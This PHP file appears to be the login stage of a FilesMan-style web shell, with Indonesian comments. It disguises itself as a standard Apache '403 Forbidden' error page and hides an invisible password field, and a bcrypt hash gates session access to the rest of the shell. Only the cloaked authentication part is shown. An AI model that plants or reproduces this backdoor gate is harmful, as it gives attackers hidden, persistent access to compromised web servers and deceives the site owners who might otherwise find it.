<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<form method="post" style="height:100%;margin:0;justify-content:center;align-items:center"><input name="pass"style="margin:0;background-color:#ffffff00;border:1px solid #ffffff00"type="password"></form>
</body></html>
<?php

    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$12$w1bti0.Wn5hvrzOwj2/o5eVsSaDmr0o1JcyXhBSYe9Esf5qxV57Z.';

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
?>
